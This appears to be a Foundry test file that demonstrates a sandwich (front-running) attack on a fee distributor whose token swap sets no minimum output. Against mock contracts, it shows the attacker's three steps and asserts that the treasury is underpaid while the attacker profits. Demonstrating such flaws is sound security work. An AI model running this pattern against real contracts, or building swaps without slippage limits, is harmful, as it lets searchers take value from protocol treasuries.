// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {FeeDistributor, IRouter} from "../../src/01_swap_no_min_out/FeeDistributor.sol";
import {MockERC20, MiniPair, MockRouter} from "./mocks/Mocks.sol";

/// @notice Every taxable transfer triggers an unbounded swap, so a searcher can
///         move the pool in the same block, let the distributor fill at the moved
///         price, and sell back. The distributor is the only loser.
contract SwapNoMinOutTest is Test {
    MockERC20 token;
    MockERC20 weth;
    MiniPair pair;
    MockRouter router;
    FeeDistributor distributor;

    address attacker = makeAddr("attacker");
    address treasury = makeAddr("treasury");

    uint256 constant LIQUIDITY = 1_000_000e18;
    uint256 constant PENDING = 100_000e18;

    function setUp() public {
        token = new MockERC20("Fee", "FEE", 18);
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        pair = new MiniPair(address(token), address(weth));

        token.mint(address(pair), LIQUIDITY);
        weth.mint(address(pair), LIQUIDITY);
        pair.sync();

        router = new MockRouter(pair, address(token), address(weth));

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        distributor = new FeeDistributor(IRouter(address(router)), address(token), treasury, path);

        // Fees that accumulated since the last distribution.
        token.mint(address(distributor), PENDING);

        weth.mint(attacker, 200_000e18);
        token.mint(attacker, 150_000e18);
        vm.prank(attacker);
        weth.approve(address(pair), type(uint256).max);
        vm.prank(attacker);
        token.approve(address(pair), type(uint256).max);
    }

    function test_front_run_takes_value_from_the_distribution() public {
        // Honest quote on the untouched pool.
        uint256 expected = pair.getAmountOut(PENDING, pair.reserve0(), pair.reserve1());

        uint256 tokenBefore = token.balanceOf(attacker);

        // 1. Attacker sells TOKEN into the pool, pushing TOKEN down.
        vm.prank(attacker);
        uint256 wethOut = pair.swap(address(token), 150_000e18);

        // 2. The distribution lands on the moved price.
        uint256 treasuryBefore = weth.balanceOf(treasury);
        distributor.distribute();
        uint256 received = weth.balanceOf(treasury) - treasuryBefore;

        // 3. Attacker buys the TOKEN back cheaper than it sold.
        vm.prank(attacker);
        pair.swap(address(weth), wethOut);

        // The treasury is paid worse than the pre-trade quote ...
        assertLt(received, (expected * 97) / 100, "swap should clear well under the quoted price");
        // ... and the attacker ends with more TOKEN than it started with.
        assertGt(token.balanceOf(attacker), tokenBefore, "attacker should profit");
        emit log_named_uint("quoted out", expected);
        emit log_named_uint("received", received);
        emit log_named_uint("attacker token gain", token.balanceOf(attacker) - tokenBefore);
    }
}
